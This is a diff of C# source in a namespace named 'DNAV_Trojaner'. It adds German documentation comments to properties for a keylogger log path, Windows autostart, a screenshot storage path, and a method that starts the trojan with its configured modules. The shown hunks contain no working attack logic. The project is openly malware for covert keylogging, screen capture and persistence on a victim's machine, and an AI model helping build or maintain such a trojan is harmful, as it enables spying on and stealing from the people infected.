@@ -35,6 +35,9 @@ namespace DNAV_Trojaner
             }
         }
 
+        /// <summary>
+        /// Legt den Ort fest, an dem die Logdatei des Keyloggers erstellt wird.
+        /// </summary>
         public string KeyloggerLogPath
         {
             get
@@ -47,6 +50,9 @@ namespace DNAV_Trojaner
             }
         }
 
+        /// <summary>
+        /// Legt fest, ob der Trojaner automatisch mit Windows gestartet werden soll.
+        /// </summary>
         public bool Autostart
         {
             get
@@ -74,6 +80,9 @@ namespace DNAV_Trojaner
             }
         }
 
+        /// <summary>
+        /// Legt den Ort fest, an dem die Screenshots gespeichert werden sollen.
+        /// </summary>
         public string ScreenshotsPath
         {
             get
@@ -194,6 +203,9 @@ namespace DNAV_Trojaner
             this.DisableWindowsKey = aggressive;
         }
 
+        /// <summary>
+        /// Startet den Trojaner mit den festgelegten Modulen
+        /// </summary>
         public void Start()
         {
             if (this.KeyloggerAndHide)
